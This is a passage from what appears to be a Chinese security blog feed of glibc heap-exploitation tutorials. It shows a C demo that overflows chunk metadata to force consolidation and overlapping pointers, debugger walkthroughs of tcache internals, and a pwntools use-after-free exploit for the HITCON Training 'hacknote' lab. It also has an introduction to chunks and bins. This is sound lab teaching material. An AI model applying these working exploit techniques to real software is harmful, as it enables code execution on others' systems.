ptr2[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;0x500 bytes for the data, 0x10 bytes for the metadata, and 0x1 byte to designate that the previous chunk is in use. Our overflow will overwrite this, and the previous size value.\n&quot;);</span><br><span class="line">    printf(&quot;We will overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed (which it hasn&apos;t).\n&quot;);</span><br><span class="line">    printf(&quot;So following that, we will place a fake previous size which is the previous QWORD behind the size. We will put it as 0x590, so it thinks that the previous chunk goes all the way back to where Chunk 0 is.\n&quot;);</span><br><span class="line">    printf(&quot;Then when we free Chunk 2, it will consolidate the heap past chunk 1 and up to chunk 0. Then we can start allocating memory from where Chunk 0, and get an overlapping pointer to where Chunk 1 is, since it thinks it has been freed.\n&quot;);</span><br><span class="line">    printf(&quot;Let&apos;s do the overwrite.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[14] = 0x590;</span><br><span class="line">    ptr1[15] = 0x510;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 2 @ %p\nPrevious Size: 0x%lx\nSize: 0x%lx\n\n&quot;, ptr2, ptr2[-2], ptr2[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we free chunk 2 to cause consolidation.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr2); //------------------&gt;b3</span><br><span class="line">    ptr2 = 0;   //------------------&gt;b4</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we can allocate a 0x500 chunk and an 0x70 chunk, and we wil get a pointer to where chunk 1 was.\n\n&quot;);</span><br><span class="line">    ptr4 = malloc(0x500);</span><br><span class="line">    ptr5 = malloc(0x70);    </span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 4: %p\t Size: 0x500\n&quot;, ptr4);</span><br><span class="line">    printf(&quot;Chunk 5: %p\t Size: 0x30\n\n&quot;, ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that we can just free Chunk 1 (which is the same as Chunk 5), and we will be able to edit a freed heap chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr1);  //-------------------&gt;b5</span><br><span class="line">    ptr1 = 0;   //-------------------&gt;b6</span><br><span class="line"></span><br><span class="line">    char *data = &quot;15935728\x00&quot;;</span><br><span class="line">    memcpy(ptr5, data, 0x9);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Chunk 5 @ %p\t Contains: %s\n\n&quot;, ptr5, (char *)ptr5);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Just like that we use a heap overflow to cause a heap consolidation past an allocated chunk, get overlapping pointers, and edit a free chunk!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先看看b1-b6几处的堆的情况。<br>在b1处下断点，目的是观察在free之前各个chunk的地址<br><img src="/images/heap_exp/2021-05-18-17-27-26.png" alt>  </p><p>在b2处下断点，我们得到heap bin的情况如下图<br><img src="/images/heap_exp/2021-05-18-17-28-36.png" alt><br>可以看出ptr0指向的chunk是被回收到了unsorted中，因为这个chunk已经超过tcache所能容纳的0x400的大小了，是直接由unsorted bin回收。<br>同时我们可以看下ptr2指向的chunk的metadata部分<br><img src="/images/heap_exp/2021-05-18-17-32-11.png" alt><br>如图所示，ptr2指向的chunk显示当前大小为0x510，而前一个紧邻的chunk的标志位为在使用</p><p>在b3处下断点，再看ptr2指向的chunk的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Chunk(addr=0x555555758c00, size=0x510, flags=)</span><br><span class="line">    [0x0000555555758c00     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br></pre></td></tr></table></figure></p><p>可以看出prev_inuse标志位已经被置空，而且标志前一个chunk的大小的数据为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/g 0x555555758c00-8-8</span><br><span class="line">0x555555758bf0:0x590</span><br></pre></td></tr></table></figure></p><p>因此<code>ptr1[14] = 0x590;ptr1[15] = 0x510;</code>已经成功溢出，并且覆盖了ptr2块的元数据，修改了prev_chunk_size和current_chunk_size以及prev_inuse标志位。这就会导致当free ptr2的chunk的时候，根据glibc的源代码，free的时候会进行向前和向后的合并，如果前面那个chunk或者后面紧邻的chunk都是未使用的话，则会把他们融合为一个大的chunk放到unsorted bin上。</p><p>在b4处下断点，看下是否如我们所愿，有一个ptr2 大小的chunk和一个0x590相加之后的chunk被放到了unsorted bin上了。<br><img src="/images/heap_exp/2021-05-18-17-44-15.png" alt><br>如我们所愿，一个0x510 + 0x590 = 0xaa0大小的chunk被放置到了unsorted bin上了，所以实际上ptr1虽然没有被释放，已经被回收到了unsorted bin中了</p><p>在b5处下断点，观察新分配的ptr4，和ptr5的来源是哪里<br><img src="/images/heap_exp/2021-05-18-17-58-45.png" alt><br><img src="/images/heap_exp/2021-05-18-17-59-23.png" alt><br>由图我们可知unsorted bin会被分割成合适大小的chunk分别返回给0x500和0x70的两个chunk。<br>ptr5指向的实际上与ptr1指向的是同一个地址，就是由于溢出导致错误的将ptr1收回到了unsorted bin中了。</p><p>在b6处下断点，观察ptr1回收到了什么地方<br><img src="/images/heap_exp/2021-05-18-17-56-06.png" alt><br>由于ptr1是0x80大小的chunk，因此还是在tcache的0x20~0x410的大小范围内的。</p><p>最后的打印输出也显示ptr5与ptr1是指向的相同的地方的，而此时ptr1已经是被会回收到了tcache中了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chunk 1: 0x555555758b80 Size: 0x70</span><br><span class="line"></span><br><span class="line">Chunk 5 @ 0x555555758b80 Contains: 15935728</span><br></pre></td></tr></table></figure></p><p>这种攻击的方法主要是通过溢出，导致紧邻的chunk的头部被修改，包括标志位，以及前一个chunk的大小的修改，使得紧邻的chunk被free的时候能够造成错误的把一个chunk 回收，这样在后续的malloc中就可以直接修改这个错误回收的chunk的数据。这是一种比较常用的攻击手法，笔者在路由器的漏洞挖掘中曾经实用过这种攻击方法，并且成功拿到了root shell。</p><h2 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h2><p>UAF就是在释放之后仍然实用chunk，这个天然就是可以修改已经free的chunk。<br>实例采用一个经典的UAF练习<a href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c" target="_blank" rel="noopener">hitcon training</a><br>利用代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./hacknote&apos;)</span><br><span class="line">elf = ELF(&apos;./hacknote&apos;)</span><br><span class="line"></span><br><span class="line">magic = 0x08048986</span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.send(str(2))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def print_note(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(16,&apos;aa&apos;)</span><br><span class="line">create(16,&apos;bb&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">create(8,p32(magic))</span><br><span class="line">print_note(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>第一次调用malloc，生成一个struct note的结构，申请的是0x8大小的内存，实际上的chunk是0x8  + 0x8 = 0x10大小的chunk，malloc的返回地址是0x0804b1a0。<br>输入size为16，第二次调用malloc，为content生成内存空间，chunk大小为0x10 +0x8=0x18，返回地址为 0x0804b1b0。<br>不知为何heap chunks在这个地方是什么都不显示。只能依靠原始的方法在malloc处打断点，得到返回的地址。</p><p>第二次add node，第二次创建struct note, 堆地址为0x0804b1d0, content地址为0x0804b1e0 </p><p>第一次delte 第一个node，tcache的结果<br><img src="/images/heap_exp/2021-05-19-14-46-03.png" alt><br>这个感觉不太对，所以感觉在32位的时候貌似GEF的heap指令显示的结果都有点问题，自己尝试确定tcache真实的状态。<br>根据我的理解，tcache与fastbin类似，都是一个数组指针在维护，那么tcache的数组中必有一个指针是指向刚刚释放的note的，他的有效载荷的地址是0x0804b1a0，我们先通过search-pattern去搜索一下这个地址，看看能不能在libc的空间中找到记载这个地址的内存，如果有那么大概率就是tcache数组的地址，<br><img src="/images/heap_exp/2021-05-19-14-53-13.png" alt><br>后来并没有发现在libc的内存空间中有这个,只是在hacknote和heap中有这个，通过源码我们知道，必定有一个静态变量存储着tcache<br>再次对比源码我发现起始fastbin数组和tcache数组还是有着很大的区别的<br>fastbin数组的元素是chunk header的指针，也就是说这个数组中确实保存着指向堆区地址的指针，而<code>tcache_entry *entries[TCACHE_MAX_BINS];</code>这个数组的元素是指向tcache_entry的，而这个东西并不是malloc_chunk数据结构，它是在什么地方生成的，还不确定。<br>经过分析源码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实际上就是将tcache_entry 实际上就是指向的chunk中有效负载的地址的。<br>向tcache中添加一个chunk的流程，当释放一个chunk的时候，首先得到他的有效负载的地址，将他赋值给一个tcache_entry指针e<br>e-&gt;key = tcache实际上就是chunk中的bk指针指向了tcache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">  /* This field exists to detect double frees.  */</span><br><span class="line">  struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>而<code>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</code>的意义是让chunk的fd指针指向了某个地址，至于这个地址是什么我觉着应该是之前已经在这个tcache链表上的一个chunk的地址。这个需要我们分析<code>PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</code>到底干了什么，因为要插入到tcache，所以肯定有tcache中将数组中的元素指向了这个e，而这个e的值就是chunk中有效负载的地址，所以我们之前分析的不错，应该在libc中有一个地址指向0x0804b1a0。但是实际上并没有，所以还是有个地方出错了。</p><p>后来经过分析发现，tcache这个只不过是一个指针，它指向的内容并不一定是在全局变量区的，而有可能是堆上分配的，经过跟踪源码发现tcache的生成过程是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcache = (tcache_perthread_struct *) victim;</span><br><span class="line"></span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">_int_malloc&#123; p = sysmalloc (nb, av); return p;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/heap_exp/2021-05-24-12-22-24.png" alt><br>所以可以判断出来与fastbin数组不同的是，tcache是在堆上存储的数据结构，而各种bin则是在libc库的数据区存储的数据结构。所以我们通过search-pattern搜索到的就是tcache的位置，<code>0x804b090</code>这个应该就是0x10 chunk 所对应的元素地址。</p><p>还有一个不同就是tcache数组中存储的是指向有效负载地址的指针，而不是chunk的头部，而本来是fd，现在叫next的位置也是直接指向下一个有效负载的位置</p><p>如果我们理解正确的话，那么与<code>0x804b090</code>紧邻的地方存储的应该就是指向0x18chunk的有效负载的地址，就是我们content的地址 <code>0x0804b1b0</code>,验证试试。<br><img src="/images/heap_exp/2021-05-19-15-35-50.png" alt><br>我们发现果然是正确的，所以tcache的大致工作原理我用下面的这张图总结<br><img src="/images/heap_exp/2021-05-19-15-41-25.png" alt><br>注意tcache数组中的元素总是指向最新添加到tcache中的chunk的。当我们再次delete note的时候，可以继续观察0x804b090的指向，如果我们理解正确的话，这个地方应该是指向第二个note的地址0x0804b1d0， 0x804b094中存储的应该是第二个content地址0x0804b1e0。<br><img src="/images/heap_exp/2021-05-19-15-45-18.png" alt><br>而0x0804b1d0这个地址应该存储的是第一个note的地址，这样才能连接起来<br><img src="/images/heap_exp/2021-05-19-15-47-18.png" alt></p><p>当理解了整个heap的变化过程，我们很快就可以理解这个UAF exp的原理。</p><ol><li>首先创建两个note然后在删除两个note得到四个在tcache上的chunk,其中有两个chunk在0x10，另外连个在0x18</li><li>再创一个note，并且让content大小为8，这样就把两个chunk 0x10大小的给重新利用上了，这个新创建的note的content实际上就是第一个note</li><li>通过给这个content赋值，就可以修改第一个note的<code>void (*printnote)();</code>函数指针</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.jianshu.com/p/f894c2961ca6" target="_blank" rel="noopener">https://www.jianshu.com/p/f894c2961ca6</a></li><li><a href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c" target="_blank" rel="noopener">https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c</a></li><li><a href="http://p4nda.top/2018/03/20/tcache/" target="_blank" rel="noopener">http://p4nda.top/2018/03/20/tcache/</a></li><li><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/heap_consolidation_explanation/index.html" target="_blank" rel="noopener">https://guyinatuxedo.github.io/27-edit_free_chunk/heap_consolidation_explanation/index.html</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;堆漏洞&quot;&gt;&lt;a href=&quot;#堆漏洞&quot; class=&quot;headerlink&quot; title=&quot;堆漏洞&quot;&gt;&lt;/a&gt;堆漏洞&lt;/h2&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用系列一：开篇</title>
    <link href="https://colorlight.github.io/2021/05/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%E5%BC%80%E7%AF%87/"/>
    <id>https://colorlight.github.io/2021/05/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%E5%BC%80%E7%AF%87/</id>
    <published>2021-05-17T10:31:13.000Z</published>
    <updated>2021-06-17T13:12:55.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="堆利用系列之开篇"><a href="#堆利用系列之开篇" class="headerlink" title="堆利用系列之开篇"></a>堆利用系列之开篇</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>堆利用这块内容相对独立但是类型较多，希望本系列文章能够让读者掌握堆利用的一些通用方法，建立堆利用的基本知识体系。<br>堆是一块需要动态管理的内存，glibc是实现堆管理的库，为了效率更高的管理堆，引入了很多机制，这就给利用堆破坏漏洞实现代码执行提供了很多攻击面。<br>但是，相比于栈破坏的利用，堆本身就很复杂，需要理解堆的一些关键部分的工作原理，才能更好的写出利用代码，因此我们这篇文章先学习了解下堆的基本概念和关键实现原理。</p><h2 id="关于libc的版本"><a href="#关于libc的版本" class="headerlink" title="关于libc的版本"></a>关于libc的版本</h2><ol><li>malloc和calloc相关的代码都在libc中，但是不同libc版本，malloc的差异性可能会很大，导致需要利用不同的利用方式来针对同一种类型的漏洞。因此，在利用之前一定要搞清楚libc的版本，是uclibc还是glibc，以及具体的子版本号。</li></ol><h2 id="Malloc-Chunk"><a href="#Malloc-Chunk" class="headerlink" title="Malloc Chunk"></a>Malloc Chunk</h2><ol><li>首先我们要学习一下Chunk的基本概念</li><li>当我们在调用malloc的时候，就会返回一个指针指向一个chunk</li><li><p>我们的测试代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *ptr;</span><br><span class="line"></span><br><span class="line">    ptr = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    strcpy(ptr, &quot;panda&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>我们可以看到在panda的前面是有一块描述区的，这一块也是chunk的一部分，我们可以把它叫做metadata部分，他主要是由一块标识前一个chunk大小的和一个表示当前chunk大小的部分组成。在64位中，一个标识的长度是8个字节，在32位中则是4个字节。<br><img src="/images/heap_exp/2021-05-17-15-44-41.png" alt></p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0:    0x00     - Previous Chunk Size</span><br><span class="line">0x8:    0x21     - Chunk Size</span><br><span class="line">0x10:     &quot;pada&quot;     - Content of chunk</span><br></pre></td></tr></table></figure><ol start="5"><li>我们可能会发现，在本例中标识前一个块的大小的是0x0，这是什么意思，这个主要是根据chunk size这个字段的标识0x21，说明前面一个紧邻的chunk是被使用了，因此previouschunksize这个字段实际上是上一个chunk的数据区部分。换句话说，根据chunk size字段的最后一位的不同，chunk的结构的意义是不一样的，但是大小是不变的。<br> <img src="/images/heap_exp/2021-05-17-16-00-30.png" alt></li><li>Chunk size字段的最后一位是标志着前面一块是否在使用的，1代表着在使用，0代表着没有使用</li><li>对于被释放的Chunk，他还有两个字段是用来指向在bin链表中相邻的chunk的，注意bin链表中相邻与实际上的相邻chunk是不一样的。有的bin链表是双向链表，需要使用fd和bk两个字段，有的链表是单向链表，只需要使用fd字段，bk无意义。</li></ol><h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><ol><li>heap中有各种各样的Bin数据结构，当一个chunk被释放了，会被bin数据结构记录，一般是一个链表。根据被释放的chunk的大小，将他们放到不同的bin中，主要有下面几种bin<ul><li>Fast bin：</li><li>Unsorted bin</li><li>Small bin</li><li>Large bin</li></ul></li><li>这个数据结构可以加快下一次分配chunk的时候更加迅速，直接在这些bin中先寻找合适的chunk</li></ol><h3 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h3><ol><li><p>在x64中，Fastbin chunk的大小是从0x20，到0x80。Fastbin共有7个链表组成，每个链表上维护的chunk的大小都是相同的，通过GEF的 heap bins fast可以方便的查看各个fast bin链表上的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────</span><br><span class="line">Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></li><li><p>注意要分清楚Fast chunk和fast bin是不同的概念，fast chunk的意思是放在fast bin链表上的chunk。fastbin本身实际上是一个数组，数组的每个元素是一个fast bin链表指针，fast bin链表指针指向heap中的chunk的地址，而chunk中有fd指针，又指向了下一个free chunk，因此这样就形成了一个单向链表。当插入chunk的时候是从头部开始插入的，就是先入后出的。<br><img src="/images/heap_exp/2021-05-17-16-30-58.png" alt></p></li></ol><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><ol><li>这个数据结构是在2.26版本中新引入的，每一个线程都会有一个tcache,目的是不需要再多线程中操作heap的时候给bin加锁，这样就可以更加的迅速。tcache是在分配chunk的时候的第一优先考虑的分配来源，甚至比fast bin还要优先。</li><li><p>tcache的数据结构与Fast bin类似，都是一个单向链表，都是先入后出的。相关的数据结构源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">struct tcache_entry *next;</span><br><span class="line">/* This field exists to detect double frees.  */</span><br><span class="line">struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="line">tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line">static __thread bool tcache_shutting_down = false;</span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure><ul><li><code>static __thread tcache_perthread_struct *tcache</code>这个是个全局变量，直接指向了这个tcache数据结构，应该是每个线程都会维护以这个这个全局变量。 tcache_perthread_struct中包含了一个tcache_entry数组，元素有64个，代表着64个链表，也就是说以供会有64个单向链表组成一个tcache，每个链表上也是与fast bin一样都是记录的相同大小的某个size的chunk。但是与fastbin不一样的是，单向链表的长度是有限制的，不能超过7，当超过7个的时候就会往对应的bin上进行分流，同样可以通过GEF的heap bins tcache去查看。64个链表维护的chunk大小范围为0x20-0x410,间隔是0x10.</li></ul></li></ol><h3 id="Unsorted，-Large-和-Small-bins"><a href="#Unsorted，-Large-和-Small-bins" class="headerlink" title="Unsorted， Large 和 Small bins"></a>Unsorted， Large 和 Small bins</h3><ol><li><p>Unosrted, Large 和 Small bins联系的比较紧密，他们都是在一个数组中的，而fastbin 和tcache都是有自己单独的数组的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> /* Normal bins packed as described above */</span><br><span class="line">mchunkptr bins[NBINS * 2 - 2];</span><br></pre></td></tr></table></figure><p> bins这个数组中的第0个元素空置，第一个元素就是指向unsorted bin list的指针，紧接着的62个元素都是指向samll bin 链表的指针，后面63个指向的是Large bin链表的指针。<br> 如下图所示的结构图<br> <img src="/images/heap_exp/2021-05-18-10-25-09.png" alt></p></li><li><p>Unsorted bin链表，这个主要是用来存放刚被释放的chunk，被free释放掉的chunk并不会直接回到对应small bin或者large bin中，而是先回到unsorted bin，以供后面malloc的时候更加快速的使用。</p><ul><li>这是一个双向链表，与fast bin链表不同是它多了一个bk指针</li><li>这个链表上的大小并不是固定的，任何大小的chunk都可以到这个链表上来</li><li>当出现malloc_consolidate，就是一次对heap的整理，就会把unsorted bin重新放到各自对应chunk size的链表上</li></ul></li><li><p>Small bin的每个链表存放的元素的大小的都是相同的，对于大小不大于0x400(64bit)的chunk会被放置在这个链表上</p></li><li>Large Bin使用来存放超过0x400大小的chunk的，但是这些链表上的chunk的大小并不一定是相同的，而是有一个范围的，比如对于0x400到0x420(仅举例)的chunk都放在第一个large bin的链表上。</li></ol><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><ol><li>是在当前在用的堆区的最顶部，它不是属于任何一个bin，是一个之前调用mmap或者sbrk从内核中分配的内存还剩下未用的区域。如果用户请求的size在所有的bin和tcache中都没有满足，就会从top chunk开始分配，剩下的未用的chunk则是新的top chunk。</li><li>如果当前用户请求的size连top chunk都满足不了，则会继续调用系统调用mmap或者sbrk扩展堆区，就是扩展top chunk。然后再把chunk返回给用户。</li><li>top chunk是所有分配的源头，第一个malloc肯定是从top chunk中分配的，因为此时所有的bin和tcache都是空的</li></ol><h3 id="各种bin和chunk在内存中的示意图"><a href="#各种bin和chunk在内存中的示意图" class="headerlink" title="各种bin和chunk在内存中的示意图"></a>各种bin和chunk在内存中的示意图</h3><p><img src="/images/heap_exp/2021-05-18-11-32-00.png" alt></p><ol><li>malloc_chunk就是chunk header，是一个chunk的开头，无论malloced或者空闲的都有这个header.</li></ol><h3 id="Main-Arena"><a href="#Main-Arena" class="headerlink" title="Main Arena"></a>Main Arena</h3><ol><li>Main Arena实际上就是一个对heap的抽象的数据结构，它包含了对各种bin的定义，tcache的定义，top chunk的定义，都是在这个数据结构中的，它在初始化的时候是作为一个全局变量保留在全局区域的。</li><li>当我们在GEF中调用heap相关的各种命令实际上都是通过对这个变量的读取来解析的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line"> [+] No Tcache in this version of libc</span><br><span class="line"> ────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────</span><br><span class="line"> Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)</span><br><span class="line"> Fastbins[idx=1, size=0x20] 0x00</span><br><span class="line"> Fastbins[idx=2, size=0x30] 0x00</span><br><span class="line"> Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line"> Fastbins[idx=4, size=0x50] 0x00</span><br><span 